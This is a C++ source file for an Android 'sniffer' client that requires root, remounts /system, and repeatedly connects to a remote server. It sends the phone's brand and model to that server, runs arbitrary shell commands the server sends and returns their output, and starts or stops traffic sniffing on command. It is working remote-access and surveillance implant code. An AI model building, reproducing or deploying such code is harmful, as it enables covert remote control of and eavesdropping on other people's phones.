/*
 * SnifferMain.cpp
 *
 *  Created on: 2014年3月3日
 *      Author: Kingsley Yau
 *      Email: Kingsleyyau@gmail.com
 */

#include "Sniffer.h"
#include "SinfferExecuteDef.h"
#include "SnifferClient.h"

#include <json/json/json.h>

Sniffer gSniffer;
SnifferClient gSnifferClient;

int main(int argc, char** argv) {
	char stra[16] = {'\0'};
	sprintf(stra, "%d", argc);

	if(2 == argc) {
		if(0 == strcmp(argv[1], "-v")) {
			printf("%s %s\n", SinfferVersionString, SnifferVersion);
			return 0;
		}
	}

	int uid = 0, gid = 0;
	if(setgid(gid) || setuid(uid)) {
		ELog("sniffer", "权限不够,请提升至管理员权限再运行程序!");
		return 0;
	}

	if( !MountSystem() ) {
		ELog("sniffer", "重新挂载/system失败, 日志文件可能无法保存!");
	}

	KLog::SetLogDirectory("/sdcard/sniffer/");
	FileLog(SnifferLogFileName, "sniffer启动!");

	while(1) {
		FileLog(SnifferLogFileName, "等待连接服务端...");
		if(gSnifferClient.ConnectServer()) {
			// 连接上服务端, 发送手机型号/手机号
			FileLog(SnifferLogFileName, "已经连接上服务端, 发送手机型号, 手机号...");
			SSCMD sscmd;
			sscmd.scmdt = SnifferServerTypeClientInfo;
			Json::Value root;
			root[PHONE_INFO_BRAND] = GetPhoneBrand();
			root[PHONE_INFO_MODEL] = GetPhoneModel();
			root[PHONE_INFO_NUMBER] = "";
			Json::FastWriter writer;
			sscmd.param = writer.write(root);
			gSnifferClient.SendCommand(sscmd);

			FileLog(SnifferLogFileName, "等待接收命令...");
			bool bCanRecv = true;
			while(bCanRecv) {
				// 开始接收命令
				SCCMD sccmd = gSnifferClient.RecvCommand();

				switch(sccmd.scmdt) {
				case ExcuteCommand:{
					// 执行Shell命令
					string cmd = sccmd.param;
					FileLog(SnifferLogFileName, "收到服务器命令, 执行Shell:(%s)", cmd.c_str());
					string result = SystemComandExecuteWithResult(cmd);

					// 返回命令结果
					SSCMD sscmd;
					sscmd.scmdt = ExcuteCommanesult;
					sscmd.param = result;
					gSnifferClient.SendCommand(sscmd);
				}break;
				case SinfferClientTypeStart:{
					// 开始监听
					FileLog(SnifferLogFileName, "收到服务器命令, 开始监听...");
					gSniffer.StartSniffer();
				}break;
				case SinfferClientTypeStop:{
					// 停止监听
					gSniffer.StopSniffer();
				}break;
				case SinfferClientTypeVersion:{
					// 返回版本
					FileLog(SnifferLogFileName, "收到服务器命令, 返回版本号:%s", SnifferVersion);
					// 返回命令结果
					SSCMD sscmd;
					sscmd.scmdt = ExcuteCommanesult;
					sscmd.param = SnifferVersion;
					gSnifferClient.SendCommand(sscmd);
				}break;
				case SinfferClientTypeNone:{
					// 与服务端连接已经断开
					FileLog(SnifferLogFileName, "与服务端连接已经断开!");
					bCanRecv = false;
				}break;
				}
			}
		}

		sleep(30);
	}

	FileLog(SnifferLogFileName, "sniffer退出!");
	return 1;
}
